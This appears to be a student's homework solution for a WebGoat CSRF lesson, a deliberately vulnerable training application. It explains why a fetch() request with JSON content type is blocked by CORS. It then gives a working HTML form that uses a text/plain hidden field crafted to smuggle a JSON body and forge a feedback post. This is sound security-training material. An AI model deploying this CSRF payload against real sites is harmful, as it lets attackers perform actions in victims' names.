## Homework-7 Solution

POST, but this time we post JSON data.

```
POST /csrf/feedback/message HTTP/1.1
{
    "name": "WebGoat",
    "email": ...
}
```

We have to use something different than content-type application JSON because of CORS.
Indeed, if we try with 

```
<html>
	<script>
fetch("http://localhost:8081/WebGoat/csrf/feedback/message", {
	  method: "POST",
	  headers: {
    		"Content-Type": "application/json"
    },
	  body: '{"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "cccc"}'
	});
	</script>
</html>
```

CORS will block our request
The solution is sent a request with a raw JSON body using the following form:

```
<form enctype="text/plain" method="POST" action="http://localhost:8080/WebGoat/csrf/feedback/message">
    <input type"submit" value="Submit">
	<input type="hidden" name='{"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignoreme":"' value='sdfsdfdf"}'>
</form>
```

Note. Here we are sending the request using just HTML, with a content-type of `text/plain`. The server will interpret the request-body as a JSON anyway.

References:
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
